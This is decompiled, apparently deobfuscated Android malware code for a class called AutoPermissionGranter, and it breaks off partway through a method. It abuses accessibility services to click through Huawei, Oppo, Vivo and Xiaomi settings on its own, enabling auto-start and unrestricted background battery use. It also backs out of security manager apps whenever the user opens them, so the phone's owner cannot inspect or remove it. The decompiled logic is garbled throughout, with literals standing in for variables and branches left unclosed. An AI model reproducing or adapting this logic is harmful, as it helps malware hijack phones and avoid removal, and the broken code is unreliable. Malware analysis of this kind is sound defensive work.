package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: AutoPermissionGranter
 * Original: Lcom/tencent/Perf_tunesxconcerningn10_ect;
 */
public class AutoPermissionGranter {

    // === FIELDS ===
    private static final String[] batteryKeywords;
    private static AccessibilityServiceCore context;
    public static boolean ifFinishAll;
    private static boolean ifFinishHhuawei;
    private static boolean ifInCheckHhuawei;
    public static boolean ifInCheckHuaWeiBatteryYh;
    public static boolean ifInCheckOppoAppDetails;
    public static boolean ifInCheckOppoAppDetailsWithEletricity;
    public static boolean ifInCheckOppoBatteryYh;
    private static boolean ifInCheckVivo;
    private static boolean ifInCheckVivoBattery;
    private static boolean ifInCheckVivoBatteryDetails;
    private static boolean ifInCheckVivoBatteryList;
    private static boolean ifInCheckXiaomiAppDetails;
    private static boolean ifXiaomioConsumeEletricityBackgroundManager;
    private static boolean isIfFinishVivo;
    private static boolean isIfFinishXiaomi;

    // === METHODS ===

    static void StaticInitializer() {
        v0 = "电池";
        v1 = "電池";
        v2 = "Battery";
        v3 = "배터리";
        v4 = "バッテリー";
        v5 = "Батарея";
        v6 = "بطارية";
        AutoPermissionGranter.batteryKeywords = "电池";
        return;
    }

    public void Constructor() {
        // new Object()
        return;
    }

    static void access$000() {
        AutoPermissionGranter.finish();
        return;
    }

    static AccessibilityServiceCore access$100() {
        v0 = AutoPermissionGranter.context;
        return v0;
    }

    static void access$1000() {
        AutoPermissionGranter.allowBackGroundConsumeElectricity();
        return;
    }

    static void access$200() {
        AutoPermissionGranter.goToBattry();
        return;
    }

    static void access$300(AccessibilityNodeInfo param0, AutoClickExecutor param1) {
        AutoPermissionGranter.clickByGesture(v0, v1);
        return;
    }

    static void access$400(int param0, List param1, AutoClickInterface param2) {
        AutoPermissionGranter.clickByRecycle(v0, v1, v2);
        return;
    }

    static void access$500(AccessibilityNodeInfo param0) {
        AutoPermissionGranter.clickChecked(v0);
        return;
    }

    static void access$600() {
        AutoPermissionGranter.goToOppoAppDetails();
        return;
    }

    static void access$700() {
        AutoPermissionGranter.allowDialogAndBackGround();
        return;
    }

    static void access$800() {
        AutoPermissionGranter.goToConsumeEletricityBackgroundManagerList();
        return;
    }

    static void access$900(int param0) {
        AutoPermissionGranter.goToConsumeEletricityBackgroundManager(v0);
        return;
    }

    private static void allowBackGroundConsumeElectricity() {
        v0 = AutoPermissionGranter.context;
        v1 = "com.vivo.abe:id/vos_button_opt";
        Sea_tunesxconcerningn10_rch.searchById(v0, "com.vivo.abe:id/vos_button_opt");
        if (v0 == null || v0 == 0) { // goto +14
        v0.isChecked();
        if ("com.vivo.abe:id/vos_button_opt" != null && "com.vivo.abe:id/vos_button_opt" != 0) { // goto +8
        AutoPermissionGranter.click(v0);
        AutoPermissionGranter.finishVivo();
        return;
    }

    private static void allowDialogAndBackGround() {
        v0 = "allowDialogAndBackGround";
        LogHelper.i("allowDialogAndBackGround");
        AutoPermissionGranter.searchSById("com.vivo.permissionmanager:id/move_btn");
        v1 = "com.vivo.permissionmanager:id/move_btn".toString();
        LogHelper.i(v1);
        if ("com.vivo.permissionmanager:id/move_btn" == null || "com.vivo.permissionmanager:id/move_btn" == 0) { // goto +16
        v1 = "666";
        LogHelper.i("666");
        // new AutoPermissionGranter$4()
        v2 = 0;
        AutoPermissionGranter.clickByRecycle(0, "com.vivo.permissionmanager:id/move_btn", "666");
        return;
    }

    private static void allowOppoBackGroundConsumeElectricity() {
        v0 = "android:id/switch_widget";
        AutoPermissionGranter.searchSById("android:id/switch_widget");
        if ("android:id/switch_widget" == null || "android:id/switch_widget" == 0) { // goto +56
        v2 = "android:id/switch_widget".size();
        v2 = 0;
        if (0 >= v1) { // goto +49
        v3 = v1 + -1;
        v3 = "android:id/switch_widget".get(v3);
        v3 = (AccessibilityNodeInfo) v3;
        v3.isChecked();
        if (v4 != null && v4 != 0) { // goto +31
        v3.getParent();
        if (v3 == null || v3 == 0) { // goto +25
        v3 = v3.getParent();
        AutoPermissionGranter.click(v3);
        v3 = 100;
        AutoPermissionGranter.sleep(100);
        v4 = "android:id/button1";
        v2 = Sea_tunesxconcerningn10_rch.searchById(100, "android:id/button1");
        AutoPermissionGranter.click(100);
        v2 = 0 + 1;
        // goto (branch)
        AutoPermissionGranter.finishOppo();
        return;
    }

    public static void check(AccessibilityEvent param0, AccessibilityServiceCore param1) {
        v0 = AutoPermissionGranter.context;
        if (v0 != null && v0 != 0) { // goto +4
        AutoPermissionGranter.context = v2;
        if (v1 == null || v1 == 0) { // goto +142
        v0 = Br_tunesxconcerningn10_and.getBrand();
        v0 = v2.toLowerCase();
        v0 = "huawei";
        v2.equals("huawei");
        if (v2 != null && v2 != 0) { // goto +18
        Br_tunesxconcerningn10_and.getBrand();
        v2.toLowerCase();
        v2.equals("honor");
        if (v2 == null || v2 == 0) { // goto +5
        AutoPermissionGranter.checkIfHuaweiApplicationAndService(v1);
        Br_tunesxconcerningn10_and.getBrand();
        v2.toLowerCase();
        v2.equals("oppo");
        if (v2 != null && v2 != 0) { // goto +18
        Br_tunesxconcerningn10_and.getBrand();
        v2.toLowerCase();
        v2.equals("realme");
        if (v2 == null || v2 == 0) { // goto +5
        AutoPermissionGranter.checkOppo(v1);
        Br_tunesxconcerningn10_and.getBrand();
        v2.toLowerCase();
        v2.equals("vivo");
        if (v2 == null || v2 == 0) { // goto +5
        AutoPermissionGranter.checkVivoEvent(v1);
        Br_tunesxconcerningn10_and.getBrand();
        v2.toLowerCase();
        v2.equals("xiaomi");
        if (v2 != null && v2 != 0) { // goto +34
        Br_tunesxconcerningn10_and.getBrand();
        v2.toLowerCase();
        v2.equals("mi");
        if (v2 != null && v2 != 0) { // goto +18
        Br_tunesxconcerningn10_and.getBrand();
        v2.toLowerCase();
        v2.equals("redmi");
        if (v2 == null || v2 == 0) { // goto +5
        AutoPermissionGranter.checkXiaomi(v1);
        return;
    }

    private static void checkCountDown(int param0) {
        v0 = new Thread();
        v1 = new AutoPermissionGranter$1();
        // new AutoPermissionGranter$1(v2)
        // new Thread(v1)
        v0.start();
        return;
    }

    private static void checkDevice() {
        Br_tunesxconcerningn10_and.getBrand();
        v0.toLowerCase();
        v0.hashCode();
        v2 = v0.hashCode();
        v2 = -1;
        // goto (branch)
        v1 = "redmi";
        v2 = v0.equals("redmi");
        if (v0 != null && v0 != 0) { // goto +3
        // goto (branch)
        v2 = 7;
        // goto (branch)
        v2 = v0.equals("honor");
        if (v0 != null && v0 != 0) { // goto +3
        // goto (branch)
        v2 = 6;
        // goto (branch)
        v2 = v0.equals("vivo");
        if (v0 != null && v0 != 0) { // goto +3
        // goto (branch)
        v2 = 5;
        // goto (branch)
        v2 = v0.equals("oppo");
        if (v0 != null && v0 != 0) { // goto +3
        // goto (branch)
        v2 = 4;
        // goto (branch)
        v2 = v0.equals("mi");
        if (v0 != null && v0 != 0) { // goto +3
        // goto (branch)
        v2 = 3;
        // goto (branch)
        v2 = v0.equals("xiaomi");
        if (v0 != null && v0 != 0) { // goto +3
        // goto (branch)
        v2 = 2;
        // goto (branch)
        v2 = v0.equals("realme");
        if (v0 != null && v0 != 0) { // goto +3
        // goto (branch)
        v2 = 1;
        // goto (branch)
        v2 = v0.equals("huawei");
        if (v0 != null && v0 != 0) { // goto +3
        // goto (branch)
        v2 = 0;
        v0 = 15000;
        AutoPermissionGranter.finish();
        // goto (branch)
        AutoPermissionGranter.execVivo();
        v0 = 11000;
        // goto (branch)
        AutoPermissionGranter.execXiaomi();
        v0 = 8000;
        // goto (branch)
        AutoPermissionGranter.execOppo();
        // goto (branch)
        AutoPermissionGranter.execHuawei();
        AutoPermissionGranter.checkCountDown(8000);
        return;
    }

    private static void checkIfHuaweiApplicationAndService(AccessibilityEvent param0) {
        v0 = AutoPermissionGranter.ifInCheckHuaWeiBatteryYh;
        if (v0 != null && v0 != 0) { // goto +44
        v0 = AutoPermissionGranter.ifFinishAll;
        if (v0 != null && v0 != 0) { // goto +40
        v0 = AutoPermissionGranter.ifInCheckHhuawei;
        v2 = v4.getEventType();
        v2 = 32;
        v3 = 0;
        if (v1 != 32) { // goto +4
        v1 = 1;
        // goto (branch)
        v4.getClassName();
        "com.android.settings.Settings$AppAndNotificationDashboardActivity".equals(32);
        if (v0 == null || v0 == 0) { // goto +12
        AutoPermissionGranter.ifInCheckHhuawei = 0;
        v0 = 500;
        AutoPermissionGranter.sleep(500);
        AutoPermissionGranter.clickAppStartManager();
        v4.getClassName();
        "com.huawei.systemmanager.appcontrol.activity.StartupAppControlActivity".equals(32);
        if (500 == null || 500 == 0) { // goto +8
        AutoPermissionGranter.performBack();
        AutoPermissionGranter.performBack();
        v4.getClassName();
        "com.huawei.systemmanager.power.ui.PowerSettingActivity ".equals(v4);
        if (v4 == null || v4 == 0) { // goto +8
        AutoPermissionGranter.performBack();
        AutoPermissionGranter.performBack();
        return;
    }

    private static void checkOppo(AccessibilityEvent param0) {
        v0 = AutoPermissionGranter.ifFinishAll;
        v1 = 1000;
        v2 = 32;
        v3 = 1;
        v4 = 0;
        if (v0 != null && v0 != 0) { // goto +35
        v0 = AutoPermissionGranter.ifInCheckOppoAppDetails;
        v5 = v7.getEventType();
        if (v5 != 32) { // goto +4
        v5 = 1;
        // goto (branch)
        v5 = 0;
        v5 = "com.android.settings.applications.InstalledAppDetailsTop";
        v7.getClassName();
        "com.android.settings.applications.InstalledAppDetailsTop".equals(v6);
        if (v0 == null || v0 == 0) { // goto +10
        AutoPermissionGranter.ifInCheckOppoAppDetails = 0;
        AutoPermissionGranter.sleep(1000);
        AutoPermissionGranter.clickConsumeEletricityManager();
        v0 = AutoPermissionGranter.ifFinishAll;
        if (v0 != null && v0 != 0) { // goto +33
        v0 = AutoPermissionGranter.ifInCheckOppoAppDetailsWithEletricity;
        v6 = v7.getEventType();
        if (v6 != 32) { // goto +4
        v6 = 1;
        // goto (branch)
        v6 = 0;
        v7.getClassName();
        "com.oplus.powermanager.fuelgaue.PowerControlActivity".equals(v6);
        if (v0 == null || v0 == 0) { // goto +10
        AutoPermissionGranter.ifInCheckOppoAppDetailsWithEletricity = 0;
        AutoPermissionGranter.sleep(1000);
        AutoPermissionGranter.allowOppoBackGroundConsumeElectricity();
        v0 = AutoPermissionGranter.ifInCheckOppoAppDetailsWithEletricity;
        v7.getEventType();
        if (1000 != 32) { // goto +4
        // goto (branch)
        v7.getClassName();
        "com.oplus.powermanager.fuelgaue.PowerControlActivity".equals(1000);
        if (v0 == null || v0 == 0) { // goto +5
        AutoPermissionGranter.performHome();
        v0 = AutoPermissionGranter.ifFinishAll;
        v7.getEventType();
        if (1000 != 32) { // goto +3
        // goto (branch)
        v7.getClassName();
        "com.oplus.powermanager.fuelgaue.PowerConsumptionOptimizationActivity".equals(v7);
        if (v7 == null || v7 == 0) { // goto +5
        AutoPermissionGranter.performHome();
        return;
    }

    private static void checkSecurityManager(AccessibilityEvent param0) {
        v1 = v2.getEventType();
        v1 = 32;
        if (v0 != 32) { // goto +46
        v2.getClassName();
        if (v0 == null || v0 == 0) { // goto +40
        v2.getClassName();
        v0.toString();
        v0.contains("com/.iqoo/.secure");
        if ("com/.iqoo/.secure" != null && "com/.iqoo/.secure" != 0) { // goto +18
        v0.contains("com/.miui/.securityscan");
        if ("com/.miui/.securityscan" != null && "com/.miui/.securityscan" != 0) { // goto +10
        v0 = v0.contains("com/.huawei/.systemmanager/.mainscreen");
        if (v0 == null || v0 == 0) { // goto +8
        v0 = AutoPermissionGranter.context;
        v1 = 2;
        v0.performGlobalAction(2);
        v2.getPackageName();
        if (v0 == null || v0 == 0) { // goto +43
        v0 = v2.getPackageName();
        v0 = v2.toString();
        v0 = "com.coloros.phonemanager";
        v2.contains("com.coloros.phonemanager");
        if ("com.coloros.phonemanager" == null || "com.coloros.phonemanager" == 0) { // goto +5
        AutoPermissionGranter.performBack();
        v2.contains("com.huawei.systemmanager");
        if ("com.huawei.systemmanager" == null || "com.huawei.systemmanager" == 0) { // goto +5
        AutoPermissionGranter.performBack();
        v2.contains("com.iqoo.secure");
        if (v2 == null || v2 == 0) { // goto +5
        AutoPermissionGranter.performBack();
        return;
    }

    private static void checkSwitch() {
        v0 = AutoPermissionGranter.context;
        v1 = "com.huawei.systemmanager:id/switcher";
        Sea_tunesxconcerningn10_rch.searchById(v0, "com.huawei.systemmanager:id/switcher");
        if (v0 == null || v0 == 0) { // goto +19
        v0 = v0.isChecked();
        if ("com.huawei.systemmanager:id/switcher" == null || "com.huawei.systemmanager:id/switcher" == 0) { // goto +13
        AutoPermissionGranter.click(v0);
        v0 = 99;
        AutoPermissionGranter.sleep(99);
        AutoPermissionGranter.clickBottomDialog();
        return;
    }

    private static void checkVivoEvent(AccessibilityEvent param0) {
        v0 = AutoPermissionGranter.ifFinishAll;
        v1 = "com.vivo.permissionmanager.activity.SoftPermissionDetailActivity";
        v2 = "com.vivo.permissionmanager.activity.PurviewTabActivity";
        v3 = 1;
        v4 = 32;
        v5 = 0;
        if (v0 != null && v0 != 0) { // goto +56
        v0 = AutoPermissionGranter.ifInCheckVivo;
        v6 = v7.getEventType();
        if (v6 != 32) { // goto +4
        v6 = 1;
        // goto (branch)
        v6 = 0;
        if (v0 == null || v0 == 0) { // goto +42
        v7.getClassName();
        "com.vivo.permissionmanager.activity.PurviewTabActivity".equals(v0);
        if (v0 != null && v0 != 0) { // goto +12
        v7.getClassName();
        v0 = "com.vivo.permissionmanager.activity.SoftPermissionDetailActivity".equals(v0);
        if (v0 == null || v0 == 0) { // goto +22
        AutoPermissionGranter.ifInCheckVivo = 0;
        v0 = 500;
        AutoPermissionGranter.sleep(500);
        v6 = new AutoPermissionGranter$8();
        // new AutoPermissionGranter$8()
        // new Thread(v6)
        500.start();
        if (500 == null || 500 == 0) { // goto +25
        v7.getClassName();
        "com.vivo.permissionmanager.activity.PurviewTabActivity".equals(500);
        if (500 != null && 500 != 0) { // goto +12
        v7.getClassName();
        v1 = "com.vivo.permissionmanager.activity.SoftPermissionDetailActivity".equals(500);
        if (500 == null || 500 == 0) { // goto +5
        AutoPermissionGranter.performBack();
        v1 = 200;
        if (500 != null && 500 != 0) { // goto +46
        v7.getEventType();
        if ("com.vivo.permissionmanager.activity.PurviewTabActivity" != 32) { // goto +4
        // goto (branch)
        if (500 == null || 500 == 0) { // goto +32
        v7.getClassName();
        "com.iqoo.powersaving.fuelgauge.PowerRankActivity".equals("com.vivo.permissionmanager.activity.PurviewTabActivity");
        if ("com.iqoo.powersaving.fuelgauge.PowerRankActivity" == null || "com.iqoo.powersaving.fuelgauge.PowerRankActivity" == 0) { // goto +20
        AutoPermissionGranter.ifInCheckVivoBattery = 0;
        AutoPermissionGranter.sleep(200);
        // new AutoPermissionGranter$9()
        // new Thread("com.vivo.permissionmanager.activity.PurviewTabActivity")
        "com.iqoo.powersaving.fuelgauge.PowerRankActivity".start();
        if ("com.iqoo.powersaving.fuelgauge.PowerRankActivity" != null && "com.iqoo.powersaving.fuelgauge.PowerRankActivity" != 0) { // goto +44
        v6 = v7.getEventType();
        if (v6 != 32) { // goto +4
        v6 = 1;
        // goto (branch)
        v6 = 0;
        if ("com.iqoo.powersaving.fuelgauge.PowerRankActivity" == null || "com.iqoo.powersaving.fuelgauge.PowerRankActivity" == 0) { // goto +30
        v7.getClassName();
        "com.vivo.applicationbehaviorengine.ui.ExcessivePowerManagerActivity".equals("com.iqoo.powersaving.fuelgauge.PowerRankActivity");
        if ("com.iqoo.powersaving.fuelgauge.PowerRankActivity" == null || "com.iqoo.powersaving.fuelgauge.PowerRankActivity" == 0) { // goto +20
        AutoPermissionGranter.ifInCheckVivoBatteryList = 0;
        AutoPermissionGranter.sleep(200);
        // new AutoPermissionGranter$10()
        // new Thread(200)
        "com.iqoo.powersaving.fuelgauge.PowerRankActivity".start();
        if ("com.iqoo.powersaving.fuelgauge.PowerRankActivity" == null || "com.iqoo.powersaving.fuelgauge.PowerRankActivity" == 0) { // goto +15
        v7.getClassName();
        "com.vivo.applicationbehaviorengine.ui.ExcessivePowerManagerActivity".equals("com.iqoo.powersaving.fuelgauge.PowerRankActivity");
        if ("com.iqoo.powersaving.fuelgauge.PowerRankActivity" == null || "com.iqoo.powersaving.fuelgauge.PowerRankActivity" == 0) { // goto +5
        AutoPermissionGranter.performBack();
        if ("com.iqoo.powersaving.fuelgauge.PowerRankActivity" != null && "com.iqoo.powersaving.fuelgauge.PowerRankActivity" != 0) { // goto +47
        v7.getEventType();
        if (200 != 32) { // goto +3
        // goto (branch)
        if ("com.iqoo.powersaving.fuelgauge.PowerRankActivity" == null || "com.iqoo.powersaving.fuelgauge.PowerRankActivity" == 0) { // goto +34
        v7.getClassName();
        v7 = "com.vivo.applicationbehaviorengine.ui.ExcessivePowerDescriptionActivity".equals(v7);
        if (v7 == null || v7 == 0) { // goto +22
        v7 = "进了";
        LogHelper.i("进了");
        AutoPermissionGranter.ifInCheckVivoBatteryDetails = 0;
        // new AutoPermissionGranter$11()
        // new Thread("com.vivo.applicationbehaviorengine.ui.ExcessivePowerDescriptionActivity")
        "进了".start();
        return;
    }

    private static void checkXiaomi(AccessibilityEvent param0) {
        v0 = AutoPermissionGranter.ifFinishAll;
        v1 = 1;
        v2 = 32;
        v3 = "com.miui.appmanager.ApplicationsDetailsActivity";
        v4 = 0;
        if (v0 != null && v0 != 0) { // goto +35
        v0 = AutoPermissionGranter.ifInCheckXiaomiAppDetails;
        v5 = v6.getEventType();
        if (v5 != 32) { // goto +4
        v5 = 1;
        // goto (branch)
        v5 = 0;
        v6.getClassName();
        "com.miui.appmanager.ApplicationsDetailsActivity".equals(v5);
        if (v0 == null || v0 == 0) { // goto +12
        AutoPermissionGranter.ifInCheckXiaomiAppDetails = 0;
        v0 = 200;
        AutoPermissionGranter.sleep(200);
        AutoPermissionGranter.clickXiaomiAutoStart();
        v6.getClassName();
        "com.miui.appmanager.ApplicationsDetailsActivity".equals(v5);
        if (200 == null || 200 == 0) { // goto +5
        AutoPermissionGranter.performBack();
        if (200 != null && 200 != 0) { // goto +36
        v6.getEventType();
        if ("com.miui.appmanager.ApplicationsDetailsActivity" != 32) { // goto +3
        // goto (branch)
        v6.getClassName();
        "com.miui.powerkeeper.ui.HiddenAppsConfigActivity".equals(v6);
        if (v6 == null || v6 == 0) { // goto +12
        AutoPermissionGranter.ifXiaomioConsumeEletricityBackgroundManager = 0;
        v6 = 800;
        AutoPermissionGranter.sleep(800);
        AutoPermissionGranter.clickXiaomiNoLimitINEletricity();
        return;
    }

    private static void click(AccessibilityNodeInfo param0) {
        if (v1 == null || v1 == 0) { // goto +13
        v0 = v1.isClickable();
        if (v0 == null || v0 == 0) { // goto +7
        v0 = 16;
        v1.performAction(16);
        return;
    }

    private static void clickAppStartManager() {
        v0 = "com.android.settings:id/arrow";
        v1 = AutoPermissionGranter.searchSById("com.android.settings:id/arrow");
        if ("com.android.settings:id/arrow" == null || "com.android.settings:id/arrow" == 0) { // goto +41
        v1 = 1;
        "com.android.settings:id/arrow".get(1);
        "com.android.settings:id/arrow".getParent();
        "com.android.settings:id/arrow".getParent();
        "com.android.settings:id/arrow".getParent();
        "com.android.settings:id/arrow".getParent();
        AutoPermissionGranter.click("com.android.settings:id/arrow");
        // goto (branch)
        "com.android.settings:id/arrow".printStackTrace();
        v0 = 250;
        AutoPermissionGranter.sleep(250);
        AutoPermissionGranter.clickSearchApp();
        return;
    }

    private static void clickBottomDialog() {
        v0 = "com.huawei.systemmanager:id/switcher";
        v1 = AutoPermissionGranter.searchSById("com.huawei.systemmanager:id/switcher");
        v1 = 0;
        "com.huawei.systemmanager:id/switcher".size();
        if (0 >= v2) { // goto +25
        v2 = "com.huawei.systemmanager:id/switcher".get(0);
        v2 = (AccessibilityNodeInfo) v2;
        v2 = v2.isChecked();
        if (v3 != null && v3 != 0) { // goto +10
        AutoPermissionGranter.click(v2);
        v2 = 100;
        AutoPermissionGranter.sleep(100);
        v1 = 0 + 1;
        // goto (branch)
        v0 = Sea_tunesxconcerningn10_rch.searchById("com.huawei.systemmanager:id/switcher", "android:id/button1");
        AutoPermissionGranter.click("com.huawei.systemmanager:id/switcher");
        v0 = 1;
        AutoPermissionGranter.ifFinishHhuawei = 1;
        AutoPermissionGranter.finishHuawei();
        return;
    }

    private static void clickByGesture(AccessibilityNodeInfo param0, AutoClickExecutor param1) {
        if (v5 != null && v5 != 0) { // goto +3
        return;
        v0 = new Path();
        // new Path()
        v1 = new Rect();
        // new Rect()
        v5.getBoundsInScreen(v1);
        v5 = v1.centerX();
        v5 = (float) v5;
        v1 = v1.centerY();
        v1 = (float) v1;
        v0.moveTo(v5, v1);
        v5 = Build$VERSION.SDK_INT;
        v1 = 24;
        if (v5 < 24) { // goto +33
        v1 = DataPackagingEngine$$ExternalSyntheticApiModelOutline0.m();
        v1 = 10;
        v3 = 50;
        DataPackagingEngine$$ExternalSyntheticApiModelOutline0.m(v0, 10, v2, 50, v4);
        v0 = DataPackagingEngine$$ExternalSyntheticApiModelOutline0.m(v5, v0);
        v0 = DataPackagingEngine$$ExternalSyntheticApiModelOutline0.m(v5);
        v0 = AutoPermissionGranter.context;
        // new AutoPermissionGranter$3(v6)
        v6 = 0;
        DataPackagingEngine$$ExternalSyntheticApiModelOutline0.m(v0, v5, 10, 0);
        return;
    }

    private static void clickByRecycle(int param0, List param1, AutoClickInterface param2) {
        v1 = v6.size();
        v1 = new StringBuilder();
        v2 = " size  ";
        // new StringBuilder(" size  ")
        v1.append(v0);
        v1 = v1.toString();
        LogHelper.i(v1);
        v1 = new StringBuilder();
        // new StringBuilder("newIndex[0]  ")
        v2 = 0;
        v3 = v5[0];
        v1.append(v3);
        v1 = v1.toString();
        LogHelper.i(v1);
        v1 = v5[0];
        v3 = 1;
        if (v1 >= v0) { // goto +59
        v1 = v6.get(v1);
        v1 = (AccessibilityNodeInfo) v1;
        if (v1 == null || v1 == 0) { // goto +59
        v1.isCheckable();
        if (v4 == null || v4 == 0) { // goto +17
        v1.isChecked();
        if (v4 != null && v4 != 0) { // goto +11
        // new AutoPermissionGranter$5(v5, v0, v6, v7)
        AutoPermissionGranter.clickByGesture(v1, 0);
        // goto (branch)
        v1 = "4444444";
        LogHelper.i("4444444");
        if ("4444444" >= v0) { // goto +29
        v0 = "gggsdfgsdfgd";
        LogHelper.i("gggsdfgsdfgd");
        v5[0] = "gggsdfgsdfgd";
        v5 = new AutoPermissionGranter$6();
        // new AutoPermissionGranter$6(v7)
        AutoPermissionGranter.clickByRecycle("gggsdfgsdfgd", v6, v5);
        // goto (branch)
        v5 = "333333333";
        LogHelper.i("333333333");
        v7.clickSuccess(1);
        return;
    }

    private static void clickChecked(AccessibilityNodeInfo param0) {
        if (v1 == null || v1 == 0) { // goto +25
        v1.isCheckable();
        if (v0 == null || v0 == 0) { // goto +19
        v1.isChecked();
        if (v0 != null && v0 != 0) { // goto +13
        v0 = v1.isClickable();
        if (v0 == null || v0 == 0) { // goto +7
        v0 = 16;
        v1.performAction(16);
        return;
    }

    private static void clickConsumeEletricityManager() {
        v0 = 1;
        AutoPermissionGranter.ifInCheckOppoAppDetailsWithEletricity = 1;
        v1 = AutoPermissionGranter.searchSById("android:id/title");
        if ("android:id/title" == null || "android:id/title" == 0) { // goto +27
        v1 = 2;
        "android:id/title".get(2);
        if ("android:id/title" == null || "android:id/title" == 0) { // goto +18
        "android:id/title".getParent();
        "android:id/title".getParent();
        AutoPermissionGranter.click("android:id/title");
        // goto (branch)
        "android:id/title".printStackTrace();
        return;
    }

    private static void clickHuaweiSleepNetwork() {
        v0 = AutoPermissionGranter.context;
        v1 = "android:id/switch_widget";
        v0 = Sea_tunesxconcerningn10_rch.searchById(v0, "android:id/switch_widget");
        if (v0 == null || v0 == 0) { // goto +10
        AutoPermissionGranter.clickChecked(v0);
        v0 = 500;
        AutoPermissionGranter.sleep(500);
        AutoPermissionGranter.goToHuaweiSettingAndService();
        return;
    }

    private static void clickSearchApp() {
        v0 = AutoPermissionGranter.context;
        v1 = "android:id/search_src_text";
        v0 = Sea_tunesxconcerningn10_rch.searchById(v0, "android:id/search_src_text");
        if (v0 == null || v0 == 0) { // goto +13
        AutoPermissionGranter.click(v0);
        v0 = 150;
        AutoPermissionGranter.sleep(150);
        AutoPermissionGranter.inputAppName("android:id/search_src_text");
        return;
    }

    private static void clickXiaomiAutoStart() {
        v0 = "com.miui.securitycenter:id/am_detail_as";
        AutoPermissionGranter.searchSById("com.miui.securitycenter:id/am_detail_as");
        if ("com.miui.securitycenter:id/am_detail_as" == null || "com.miui.securitycenter:id/am_detail_as" == 0) { // goto +40
        v1 = "com.miui.securitycenter:id/am_detail_as".size();
        if (v1 <= 0) { // goto +34
        v1 = 0;
        "com.miui.securitycenter:id/am_detail_as".get(0);
        AutoPermissionGranter.findChildNodeById("com.miui.securitycenter:id/am_detail_as", "com.miui.securitycenter:id/am_switch");
        if ("com.miui.securitycenter:id/am_detail_as" == null || "com.miui.securitycenter:id/am_detail_as" == 0) { // goto +19
        AutoPermissionGranter.click("com.miui.securitycenter:id/am_detail_as");
        Sea_tunesxconcerningn10_rch.searchById("com.miui.securitycenter:id/am_detail_as", "android:id/button1");
        AutoPermissionGranter.click("com.miui.securitycenter:id/am_detail_as");
        AutoPermissionGranter.goToXiaomioConsumeEletricityBackgroundManager();
        return;
    }

    private static void clickXiaomiNoLimitINEletricity() {
        v0 = "android:id/title";
        v1 = AutoPermissionGranter.searchSById("android:id/title");
        if ("android:id/title" == null || "android:id/title" == 0) { // goto +44
        v1 = 1;
        "android:id/title".get(1);
        if ("android:id/title" == null || "android:id/title" == 0) { // goto +35
        v1 = "android:id/title".getParent();
        v1 = "android:id/title".getParent();
        v1 = 0;
        "android:id/title".getChild(0);
        if (0 == null || 0 == 0) { // goto +20
        0.isCheckable();
        if (v2 == null || v2 == 0) { // goto +14
        0.isChecked();
        if (0 != null && 0 != 0) { // goto +8
        AutoPermissionGranter.click("android:id/title");
        AutoPermissionGranter.finishXiaomi();
        return;
    }

    public static void execHuawei() {
        AutoPermissionGranter.goToHuaWeiSetting();
        return;
    }

    public static void execOppo() {
        AutoPermissionGranter.goToOppoSetting();
        return;
    }

    public static void execVivo() {
        AutoPermissionGranter.goToAppVivoSettingDetails();
        return;
    }

    public static void execXiaomi() {
        AutoPermissionGranter.goToXiaomioAppSettingDetails();
        return;
    }

    public static AccessibilityNodeInfo findChildNodeById(AccessibilityNodeInfo param0, String param1) {
        v0 = 0;
        if (v5 == null || v5 == 0) { // goto +32
        if (v6 != null && v6 != 0) { // goto +3
        // goto (branch)
        v2 = v5.getChildCount();
        v2 = 0;
        if (0 >= v1) { // goto +22
        v5.getChild(0);
        if (v3 == null || v3 == 0) { // goto +13
        v3.getViewIdResourceName();
        v2 = v6.equals(v4);
        if (v4 == null || v4 == 0) { // goto +3
        return v3;
        v2 = 0 + 1;
        // goto (branch)
        return 0;
    }

    private static void finish() {
        v0 = 1;
        AutoPermissionGranter.ifFinishAll = 1;
        AutoPermissionGranter.performBackAndHome();
        v1 = MalwareConstants.Evnet_Type_FInish_Perfect;
        // new AccessibilityEventMonitor$Event(v1)
        AccessibilityEventMonitor.publish(1);
        return;
    }

    private static void finishHuawei() {
        AutoPermissionGranter.finish();
        return;
    }

    private static void finishOppo() {
        AutoPermissionGranter.finish();
        return;
    }

    private static void finishVivo() {
        v0 = 1;
        AutoPermissionGranter.isIfFinishVivo = 1;
        AutoPermissionGranter.finish();
        return;
    }

    private static void finishXiaomi() {
        v0 = 1;
        AutoPermissionGranter.isIfFinishXiaomi = 1;
        AutoPermissionGranter.finish();
        return;
    }

    private static void goToAppVivoSettingDetails() {
        v0 = 1;
        AutoPermissionGranter.ifInCheckVivo = 1;
        v1 = "Y85";
        v1 = 1.contains("Y85");
        v1 = 268435456; // 0x10000000
        v2 = "packagename";
        v3 = "com.vivo.permissionmanager";
        if (1 == null || 1 == 0) { // goto +12
        v4 = "Y85A";
        1.contains("Y85A");
        if (1 == null || 1 == 0) { // goto +12
        1.contains("vivo Y53L");
        if (1 == null || 1 == 0) { // goto +37
        // new Intent()
        1.setClassName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.PurviewTabActivity");
        "com.vivo.permissionmanager".getPackageName();
        1.putExtra("packagename", "com.vivo.permissionmanager");
        1.putExtra("tabId", "1");
        1.addFlags("Y85");
        "Y85".startActivity(1);
        // goto (branch)
        // new Intent()
        1.setClassName("1", "com.vivo.permissionmanager.activity.SoftPermissionDetailActivity");
        1.setAction("secure.intent.action.softPermissionDetail");
        "secure.intent.action.softPermissionDetail".getPackageName();
        1.putExtra("tabId", "secure.intent.action.softPermissionDetail");
        1.addFlags("Y85");
        "Y85".startActivity(1);
        return;
    }

    private static void goToAutoStart() {
        v0 = AutoPermissionGranter.context;
        v1 = "自启动";
        Sea_tunesxconcerningn10_rch.searchByText(v0, "自启动");
        if (v0 == null || v0 == 0) { // goto +33
        v0.getParent();
        if (v0 == null || v0 == 0) { // goto +27
        v1 = v0.getChildCount();
        v1 = "自启动" + -1;
        v0.getChild("自启动");
        v0.isCheckable();
        if ("自启动" == null || "自启动" == 0) { // goto +11
        v0.isChecked();
        if ("自启动" != null && "自启动" != 0) { // goto +5
        AutoPermissionGranter.click(v0);
        return;
    }

    private static void goToBattry() {
        v0 = 1;
        AutoPermissionGranter.ifInCheckVivoBattery = 1;
        v1 = "android.intent.action.POWER_USAGE_SUMMARY";
        // new Intent("android.intent.action.POWER_USAGE_SUMMARY")
        v2 = "android.intent.action.POWER_USAGE_SUMMARY".getPackageManager();
        v2 = 0;
